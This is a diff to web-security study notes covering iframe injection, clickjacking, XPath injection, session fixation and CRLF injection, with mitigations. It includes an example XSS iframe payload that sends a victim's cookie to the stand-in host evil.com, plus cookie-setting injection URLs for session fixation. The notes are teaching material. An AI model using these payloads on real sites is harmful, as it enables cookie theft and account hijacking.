@@ -109,7 +109,7 @@ https://www.youtube.com/watch?v=sJdWuPHKRRY
 		3. Similar to stored XSS.
 	
 Mitigation:
-	All data being retrived from the database must be escaped or encoded before using it.
+	All data being retrieved from the database must be escaped or encoded before using it.
 
 11. SSL versus TLS
 
@@ -206,7 +206,7 @@ It happens in two steps-
 
 	This is a host identity and not a user identity. Once the client hits yes, this gets saved in the *known_hosts* file
 
-		> Server key. This key is regenerated after evry hour and its default size is 768bits. (/etc/ssh/sshd_config)
+		> Server key. This key is regenerated after every hour and its default size is 768bits. (/etc/ssh/sshd_config)
 
 		> 8 random bytes also called checkbytes. Its necessary to send these bytes by the client to the server in its next reply.
 
@@ -294,4 +294,72 @@ It happens in two steps-
 			13^5 mod 1 = 10				    11^7 mod 1 = 10
 
 Both RAM and SITA have a common symmetric number now.
+
+18. Iframe Injection
+
+>An example would consist of an attacker convincing the user to navigate to a web page the attacker controls. The attacker's page then loads malicious JavaScript and an HTML iframe pointing to a legitimate site. Once the user enters credentials into the legitimate site within the iframe, the malicious JavaScript steals the keystrokes. Ex: This can be used to exploit a known bug in IE browsers. 
+
+>Iframe injection using XSS
+
+		1. Attackers hosts a page evil.com
+
+		2. A website example.com has a XSS vulnerable parameter q.
+
+		3. The user is tricked to visit evil.com that contains an iframe, which makes request to the flawed example.com
+
+	<iframe style="position:absolute;top:-9999px" src="http://example.com/↵
+    flawed-page.html?q=<script>document.write('<img src=\"http://evil.com/↵
+    ?c='+encodeURIComponent(document.cookie)+'\">')</script>"></iframe>
+
+		4. When the evil.com page is visited by the victim, the browser makes a request to example.com silently using iframe.
+		The request contains the xss vulnerable parameter and the payload is injected along.
+
+		5. The payload says to make a request to evil.com along with the cookie of the example.com website.
+
+Here the user doesn't knows that example.com was visited.
+
+19. X-Frame-Options headers tells the browser not to allow loading of the webpage in an iframe, frame or object.
+
+20. Clickjacking is an attack that occurs when an attacker uses a transparent iframe in a window to trick a user into clicking on a  button or link, to another server in which they have an identical looking window.
+
+	Example: For example, imagine an attacker who builds a web site that has a button on it that says "click here for a free iPod". 		However, on top of that web page, the attacker has loaded an iframe with your mail account, and lined up exactly the "delete 			all messages" button directly on top of the "free iPod" button. The victim tries to click on the "free iPod" button but 		instead actually clicked on the invisible "delete all messages" button. In essence, the attacker has "hijacked" the user's 			click, hence the name "Clickjacking".
+
+21. XPATH injection
+
+		1. Xpath is a language used to query certain parts of a XML document. It can be compared to the SQL language used to query 				databases.
+
+		2. XPath Injection attacks occur when a web site uses user-supplied information to construct an XPath query for XML data.
+
+		3. By sending intentionally malformed information into the web site, an attacker can find out how the XML data is structured, 				or access data that he may not normally have access to.
+
+		Mitigation:
+			 >Use a parameterized XPath interface if one is available, or escape the user input to make it safe to include in a 				 dynamically constructed query.
+
+			 >input containing any XPath metacharacters such as " ' / @ = * [ ] ( and ) should be rejected.
+
+22. Session Fixation attack is an attack technique that forces a user's session ID to an explicit value that permits an attacker to hijack a valid user session
+
+The example below explains a simple form, the process of the attack, and the expected results.
+
+(1)The attacker has to establish a legitimate connection with the web server which 
+(2) issues a session ID or, the attacker can create a new session with the proposed session ID, then, 
+(3) the attacker has to send a link with the established session ID to the victim, she has to click on the link sent from the attacker accessing the site, 
+(4) the Web Server saw that session was already established and a new one need not to be created, 
+(5) the victim provides his credentials to the Web Server, 
+(6) knowing the session ID, the attacker can access the user's account.
+
+		> Meta tag attack : Using this we can set a cookie value on the server.
+			http://website.kon/<meta http-equiv=Set-Cookie content=”sessionid=abcd”>
+
+		> A Cross-site Scripting vulnerability present on any web site in the domain can be used to modify the current cookie value.
+			http://example/<script>document.cookie="sessionid=1234;%20domain=.example.dom";</script>
+
+		> HTTP header response
+			The insertion of the value of the SessionID into the cookie manipulating the server response can be made, intercepting 				the packages exchanged between the client and the Web Application inserting the Set-Cookie parameter.
+
+https://www.owasp.org/index.php/Session_fixation
+
+23. CRLF Injection / HTTP Response Splitting is a web application vulnerability happens due to direct passing of user entered data to the response header fields like (Location, Set-Cookie and etc) without proper sanitsation, which can result in various forms of security exploits. Security exploits range from XSS, Cache-Poisoning, Cache-based defacement, page injection and etc.
+
+>https://prakharprasad.com/crlf-injection-http-response-splitting-explained/
 
